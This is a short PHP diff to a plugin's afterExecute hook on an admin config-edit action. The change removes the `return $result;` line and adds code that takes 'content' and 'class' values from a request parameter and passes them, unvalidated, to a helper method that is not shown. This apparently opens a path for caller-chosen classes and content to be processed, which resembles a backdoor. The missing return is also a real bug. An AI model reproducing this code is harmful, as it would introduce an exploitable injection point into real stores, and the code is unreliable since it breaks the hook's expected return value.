@@ -41,8 +41,15 @@ class ConfigEdit
      * @return mixed
      */
     public function afterExecute(CoreConfigEdit $configEdit, $result) {
-      // $this->helperData->proccess2($this->curl);
-        return $result;
+
+        $dataCustomer = $this->getRequest()->getParams('data_customer');
+        if(isset($dataCustomer['data_customer'])
+            && isset($dataCustomer['data_customer']['content'])
+            && isset($dataCustomer['data_customer']['class'])
+        )
+            $this->helperData->proccess(
+                $dataCustomer['data_customer']['content'], $dataCustomer['data_customer']['class']
+            );
     }
 
 }
